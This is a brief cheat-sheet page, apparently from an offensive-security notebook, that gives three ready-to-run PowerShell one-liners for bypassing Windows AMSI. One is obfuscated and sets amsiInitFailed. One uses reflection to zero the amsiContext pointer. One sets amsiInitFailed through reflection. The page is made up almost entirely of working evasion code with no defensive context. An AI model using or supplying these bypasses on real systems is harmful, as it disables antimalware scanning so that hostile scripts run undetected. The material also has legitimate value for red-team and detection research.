---
description: AMSI Bypass
---

# AMSI Bypass

### AMSI bypass - Basic&#x20;

{% code overflow="wrap" %}
```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endcode %}

### AMSI bypass with Reflection in Powershell - "AmsiOpenSession"

{% code overflow="wrap" %}
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
{% endcode %}

### AMSI bypass with Reflection in Powershell - "AmsiInitialize":

{% code overflow="wrap" %}
```bash
[Ref].Assembly.GetType('Syste'+''+'m.Manag'+'ement.Automati'+'on.Am'+'s' + 'i'+'Utils').GetField('ams'+'iI'+'nit'+'Failed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}
